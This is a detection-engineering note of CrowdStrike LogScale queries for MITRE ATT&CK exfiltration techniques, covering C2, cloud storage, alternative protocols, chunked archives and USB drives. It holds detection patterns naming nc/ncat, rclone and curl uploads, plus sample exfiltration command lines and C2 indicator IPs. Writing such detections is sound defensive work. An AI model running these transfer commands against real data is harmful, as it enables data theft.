# TA0010 - Exfiltration

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Exfiltration. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1041]] - Exfiltration Over C2 Channel

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1041
> technique_name:: Exfiltration Over C2 Channel
> logscale_stream:: NetworkConnectIP4
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect unusual outbound transfer volume or repeated connections from archive/scripting utilities to external destinations.
* Telemetry Requirements: NetworkConnectIP4, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Archive or Script Process External Transfer Burst
// Focus: Compression or scripting tools with repeated external connections
#event_simpleName=NetworkConnectIP4
| ImageFileName=/\\(powershell|pwsh|curl|wget|rclone|7z|rar|winrar|tar)\.exe$/i
| NOT cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
| groupBy([aid, ComputerName, ImageFileName, ContextProcessId, RemoteAddressIP4], function=[count(as=connection_count), collect(RemotePort, limit=20)])
| connection_count >= 20
| sort(connection_count, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Archive or transfer utility producing many external connections.
* Triage Steps: Review process command line and staged archives; validate destination reputation and cloud service context.
* Potential False Positives: Legitimate cloud backup/sync, package downloads, admin transfers.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"NetworkConnectIP4","ImageFileName":"\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","RemoteAddressIP4":"198.51.100.10","RemotePort":443}
```

---

### [[T1567.002]] - Exfiltration to Cloud Storage

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1567.002
> technique_name:: Exfiltration to Cloud Storage
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect command-line interaction with common cloud storage providers or rclone-style synchronization from sensitive directories.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Cloud Storage Exfiltration via CLI
// Focus: rclone/curl/PowerShell upload to cloud storage domains
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(rclone|curl|powershell|pwsh|azcopy|winscp|scp)\.exe$/i
| CommandLine=/(copy|sync|put|upload|--progress|Invoke-RestMethod|Invoke-WebRequest).*(drive\.google|dropbox|box\.com|onedrive|blob\.core\.windows\.net|s3\.amazonaws|mega\.nz|transfer\.sh)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Cloud storage domains and upload/sync verbs in command-line tooling.
* Triage Steps: Identify source path, amount of data, destination account/bucket, and whether credentials/tokens were embedded.
* Potential False Positives: Approved cloud migration and backup utilities.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"rclone.exe","CommandLine":"rclone sync C:\\Users\\alice\\Documents remote:dropbox/backups"}
```

---

### [[T1048]] - Exfiltration Over Alternative Protocol

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1048
> technique_name:: Exfiltration Over Alternative Protocol
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect command-line exfiltration over FTP/SFTP/SCP/SMTP or custom protocols rather than normal browser upload paths.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Alternative Protocol Data Transfer
// Focus: ftp/scp/sftp/winscp/curl mail or non-web upload usage
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(ftp|sftp|scp|winscp|curl|powershell|pwsh|nc|ncat)\.exe$/i
| CommandLine=/(put\s+|mput\s+|scp\s+|sftp\s+|ftp:\/\/|smtp|--upload-file|--data-binary|nc\s+.*<|ncat\s+.*<)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Upload verbs and alternative transfer protocols.
* Triage Steps: Identify source file and destination; review network volume and credentials used.
* Potential False Positives: Legitimate file transfers and admin work.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"curl.exe","CommandLine":"curl --upload-file C:\\Users\\Public\\data.zip ftp://host/upload/"}
```

---

### [[T1048]] - Exfiltration Over Alternative Protocol — CQL Hub: High Volume SMB File Copy (Data Exfiltration / Ransomware) – Microsoft Defender for Identity

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1048
> technique_name:: Exfiltration Over Alternative Protocol
> logscale_stream:: Identity
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: high_volume_smb_file_copy_data_exfiltration_ransomware_microsoft_defender_for_identity.yml
> cql_hub_name:: High Volume SMB File Copy (Data Exfiltration / Ransomware) – Microsoft Defender for Identity
> cql_hub_author:: Kundan Kumar
> cql_hub_mitre_ids:: T1048
> related_mitre_ids:: T1048
> required_modules:: Identity
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Exfiltration, CQL_Hub

* Detection Objective: Detects a large volume of file transfers over SMB within a short timeframe, as identified by Microsoft Defender for Identity. This behavior may indicate bulk data exfiltration or ransomware activity, where files are rapidly copied, staged, or encrypted across systems and should be investigated immediately.

* Telemetry Requirements: Identity
* Source: CQL Hub (`high_volume_smb_file_copy_data_exfiltration_ransomware_microsoft_defender_for_identity.yml`), author: Kundan Kumar.
* Original CQL Hub MITRE IDs: T1048.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Identity; Microsoft Defender for Identity telemetry; Microsoft Defender telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
#Vendor = "microsoft"
| #event.module = "defender-identity"
| Vendor.category = "AdvancedHunting-IdentityDirectoryEvents"
| Vendor.properties.ActionType = "SMB file copy"
| groupBy([user.name, source.address], function=[count(as=file_copies),collect(fields=Vendor.properties.DestinationDeviceName),collect(fields=Vendor.properties.DeviceName),min(@timestamp, as=start_time),max(@timestamp, as=end_time)])
| file_copies > 50
| time_diff_min := (end_time - start_time) / 60000
| time_diff_min <= 10
| start_time_fmt := formatTime("%Y-%m-%d %H:%M:%S", field=start_time, timezone="UTC")
| end_time_fmt := formatTime("%Y-%m-%d %H:%M:%S", field=end_time, timezone="UTC")
| drop([start_time, end_time])
| sort([file_copies], order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Detects a large volume of file transfers over SMB within a short timeframe, as identified by Microsoft Defender for Identity. This behavior may indicate bulk data exfiltration or ransomware activity, where files are rapidly copied, staged, or encrypted across systems and should be investigated immediately.
* Key Indicators: Review query output fields and filters from `high_volume_smb_file_copy_data_exfiltration_ransomware_microsoft_defender_for_identity.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1048]] - Exfiltration Over Alternative Protocol — CQL Hub: Snowman

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1048
> technique_name:: Exfiltration Over Alternative Protocol
> logscale_stream:: Unknown
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: snowman.yml
> cql_hub_name:: Snowman
> cql_hub_author:: MS
> related_mitre_ids:: T1048
> cql_hub_tags:: Hunting, Detection
> tags:: CQL, MITRE/Exfiltration, CQL_Hub

* Detection Objective: This query detects potential exploitation of the April 2026 Adobe Reader zero-day vulnerability by identifying suspicious network connections originating from Adobe Reader processes shortly after they start. The exploit abuses legitimate Adobe JavaScript APIs (util.readFileIntoStream() and RSS.addFeed()) to exfiltrate system information to attacker-controlled servers.

* Telemetry Requirements: Validate source fields in local telemetry.
* Source: CQL Hub (`snowman.yml`), author: MS.

#### Production-Ready CQL Query:

```cql
// Detect Adobe Reader zero-day (April 2026) - Process + suspicious network activity
  // Stage 1: Adobe Reader process starts
  #event_simpleName=ProcessRollup2
    ImageFileName=/\\(Acrobat|AcroRd32|AcroRd64)\.exe$/i
  | rename(field=TargetProcessId, as=AdobePid)
  | rename(field=aid, as=aid)
  | rename(field=ProcessStartTime, as=PdfOpenTime)
  | join({
      // Stage 2: Network connections from Adobe OR child processes
      #event_simpleName=NetworkConnectIP4 OR #event_simpleName=NetworkConnectIP6
      | ContextBaseFileName=/\b(Acrobat|AcroRd32|AcroRd64|AdobeCollabSync|Synchronizer)\.exe\b/i
      | rename(field=ContextProcessId, as=AdobePid)
      | rename(field=ContextTimeStamp, as=ConnectionTime)
  }, field=AdobePid, key=AdobePid, include=[RemoteAddressIP4, RemoteAddressIP6, RemotePort, ConnectionTime])

  | RemoteAddressIP4=* OR RemoteAddressIP6=*

  // Filter: non-standard ports (C2 used 45191, 34123)
  // Adobe legitimately connects to 80, 443 — flag anything else
  | RemotePort!=80 RemotePort!=443

  | eval(TimeDiffMs=ConnectionTime-PdfOpenTime)
  | test(TimeDiffMs >= 0)
  | test(TimeDiffMs <= 60000)
  | eval(TimeDiffSeconds=TimeDiffMs/1000)

  // High-confidence: known C2 IOCs
  | case {
      RemoteAddressIP4="169.40.2.68" OR RemoteAddressIP4="188.214.34.20"
        | Confidence:="HIGH - Known C2 IOC";
      RemotePort=45191 OR RemotePort=34123
        | Confidence:="MEDIUM - Known C2 port";
      *
        | Confidence:="LOW - Anomalous non-HTTP(S) connection";
    }

  | table([aid, ComputerName, ImageFileName, CommandLine,
           RemoteAddressIP4, RemotePort, Confidence,
           PdfOpenTime, ConnectionTime, TimeDiffSeconds],
    limit=20000)
  | sort(Confidence, order=desc)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: # How it works The query operates in two stages, joined together:  ## Stage 1 — Process Detection Searches for ProcessRollup2 events (process executions) where the image file name matches any of the three Adobe Reader binaries: Acrobat.exe (modern), AcroRd32.exe (legacy 32-bit), or AcroRd64.exe (64-bit). It captures the process ID and start time for correlation.  ## Stage 2 — Network Connection Correlation Joins against NetworkConnectIP4 and NetworkConnectIP6 events to find outbound network connections made by Adobe Reader or its known helper processes (AdobeCollabSync.exe, Synchronizer.exe). The join matches on process ID so connections are attributed to the correct Adobe session.  ## Filtering  - Connections to ports 80 and 443 are excluded — these are normal Adobe update/cloud traffic and would generate excessive false positives. - Only connections occurring within 60 seconds of the process starting are retained, since the exploit initiates C2 communication shortly after the PDF is opened.  ## Confidence Scoring Results are triaged into three tiers:  #### HIGH: Connection to a known C2 IP (169.40.2.68 or 188.214.34.20)       #### MEDIUM      Connection to a known C2 port (45191 or 34123) on any IP         #### LOW         Any other non-HTTP/S outbound connection from Adobe within the time window
* Key Indicators: Review query output fields and filters from `snowman.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1020]] - Automated Exfiltration

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1020
> technique_name:: Automated Exfiltration
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect scheduled or scripted archive-and-transfer chains indicating automated exfiltration.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Scheduled Archive and Transfer Chain
// Focus: Scheduled task/script invokes archive utility and network transfer utility
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(taskeng|taskhostw|svchost|services|schtasks)\.exe$/i
| ImageFileName=/\\(powershell|pwsh|cmd|7z|rar|rclone|curl|winscp|scp)\.exe$/i
| CommandLine=/(Compress-Archive|7z\s+a|rar\s+a|rclone\s+(copy|sync)|curl\s+--upload-file|scp\s+)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Scheduled/service parent and archive or transfer command.
* Triage Steps: Inspect task/service definition and determine data source and destination.
* Potential False Positives: Backups and scheduled reporting exports.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"taskeng.exe","FileName":"rclone.exe","CommandLine":"rclone sync C:\\Reports remote:bucket"}
```

---

### [[T1030]] - Data Transfer Size Limits

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1030
> technique_name:: Data Transfer Size Limits
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect splitting archives into chunks before outbound transfer, a common way to evade size-based controls.
* Telemetry Requirements: ProcessRollup2, FileWritten, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Chunked Archive Preparation for Exfiltration
// Focus: 7z/rar/split chunk sizes and volume switches
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(7z|rar|winrar|split|powershell|pwsh)\.exe$/i
| CommandLine=/(-v\d+[kmg]|-split|split\s+-b|ChunkSize|ReadCount|\.7z\.001|\.part\d+|\.z\d+)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Archive volume/chunking switches and multipart extensions.
* Triage Steps: Locate all archive parts and correlate to upload process.
* Potential False Positives: Legitimate large-file archiving.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"7z.exe","CommandLine":"7z a -v10m C:\\Users\\Public\\data.7z C:\\Shares\\Finance"}
```

---

### [[T1052]] - Exfiltration Over Physical Medium

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1052
> technique_name:: Exfiltration Over Physical Medium
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Exfiltration

* Detection Objective: Detect bulk copy/backup commands targeting removable-drive style destinations.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: Bulk Copy to Removable Drive
// Focus: robocopy/xcopy/PowerShell copying sensitive directories to drive letter
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(robocopy|xcopy|powershell|pwsh|cmd)\.exe$/i
| CommandLine=/(robocopy|xcopy|Copy-Item).*(Documents|Desktop|Shares|Finance|HR|OneDrive).*[A-Z]:\\/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Bulk copy tools with sensitive source and drive-letter destination.
* Triage Steps: Validate whether destination is removable media and review copied file set.
* Potential False Positives: User backups to external drives.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","FileName":"robocopy.exe","CommandLine":"robocopy C:\\Shares\\Finance E:\\Backup /E"}
```

---

### [[T1052]] - Exfiltration Over Physical Medium — CQL Hub: Decode VolumeDeviceCharacteristics Bitmask

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1052
> technique_name:: Exfiltration Over Physical Medium
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: Decode_VolumeDeviceCharacteristics_Bitmask.yml
> cql_hub_name:: Decode VolumeDeviceCharacteristics Bitmask
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1052
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Exfiltration, CQL_Hub

* Detection Objective: The query decodes the VolumeDeviceCharacteristics bitfield to reveal device properties such as removable media, network drives, virtual volumes, or portable devices.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`Decode_VolumeDeviceCharacteristics_Bitmask.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; container image/runtime telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
| bitfield:extractFlags(
 field=VolumeDeviceCharacteristics,
  output=[
    [0,FILE_REMOVABLE_MEDIA],
    [1,FILE_READ_ONLY_DEVICE],
    [2,FILE_FLOPPY_DISKETTE],
    [3,FILE_WRITE_ONCE_MEDIA],
    [4,FILE_REMOTE_DEVICE],
    [5,FILE_DEVICE_IS_MOUNTED],
    [6,FILE_VIRTUAL_VOLUME],
    [7,FILE_AUTOGENERATED_DEVICE_NAME],
    [8,FILE_DEVICE_SECURE_OPEN],
    [9,FILE_CHARACTERISTIC_PNP_DEVICE],
    [10,FILE_CHARACTERISTIC_TS_DEVICE],
    [11,FILE_CHARACTERISTIC_WEBDAV_DEVICE],
    [12,FILE_CHARACTERISTIC_CSV],
    [13,FILE_DEVICE_ALLOW_APPCONTAINER_TRAVERSAL],
    [14,FILE_PORTABLE_DEVICE]
])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/Decode%20VolumeDeviceCharacteristics%20Bitmask.md)
* Key Indicators: Review query output fields and filters from `Decode_VolumeDeviceCharacteristics_Bitmask.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1052]] - Exfiltration Over Physical Medium — CQL Hub: Detect Data Exfiltration via external storage devices

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1052
> technique_name:: Exfiltration Over Physical Medium
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: data_exfiltration_external_storage.yml
> cql_hub_name:: Detect Data Exfiltration via external storage devices
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: T1052
> related_mitre_ids:: T1052
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Exfiltration, CQL_Hub

* Detection Objective: This query shows unusual activity involving external storage devices, such as large file copy operations, bulk transfers to physical external media. While USB devices are common for legitimate use, adversaries may exploit them to exfiltrate confidential data outside normal monitoring channels. Such activity is especially concerning in restricted environments, as it bypasses network-based detection controls and can indicate insider threat or physical compromise.
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`data_exfiltration_external_storage.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: T1052.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=/FileWritten/i and IsOnRemovableDisk = 1
| VolumeSessionUUID=*
| "Size (MB)" := Size/1024/1024
| format(format="%.2f", field=["Size (MB)"], as="Size (MB)")
| join(query={#event_simpleName=DcUsbDeviceConnected | rename(DeviceInstanceId, as="DiskParentDeviceInstanceId")}, mode=left, field=[DiskParentDeviceInstanceId], include=[DeviceManufacturer, DeviceProduct])
| groupBy([ComputerName, UserName, DeviceManufacturer, DeviceProduct], function=[min(field=@timestamp, as=firstTime),max(field=@timestamp, as=lastTime),sum(Size, as="Size")])
| "Size (MB)" := Size/1024/1024
| format(format="%.2f", field=["Size (MB)"], as="Size (MB)")

```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `data_exfiltration_external_storage.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1052]] - Exfiltration Over Physical Medium — CQL Hub: Get USB Devices

> [!metadata]+ Detection Metadata
> tactic:: Exfiltration
> technique_id:: T1052
> technique_name:: Exfiltration Over Physical Medium
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: get_usb_devices.yml
> cql_hub_name:: Get USB Devices
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1052
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Exfiltration, CQL_Hub

* Detection Objective: Retrieving a list of USB Devices plugged to the device

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`get_usb_devices.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=DcUsbDeviceConnected
| DeviceTimeStamp :=parseTimeStamp(field=DeviceTimeStamp,format=seconds)
| "Time Inserted" := formatTime("%Y-%m-%dT%H:%M:%S.%L", field=DeviceTimeStamp,timezone="Zulu")
| rename([[ComputerName,"Host Name"],[DevicePropertyClassName,"Connection Type"],[DeviceManufacturer,Manufacturer],[DeviceProduct,"Product Name"], [DevicePropertyDeviceDescription,Description], [DevicePropertyClassGuid,GUID],[DeviceInstanceId,"Device ID"]])
| groupBy([aid, "Device ID"], function=([collect(["TimeInserted", ComputerName, "Connection Type",Manufacturer, "Product Name", Description, GUID])]))
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `get_usb_devices.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.
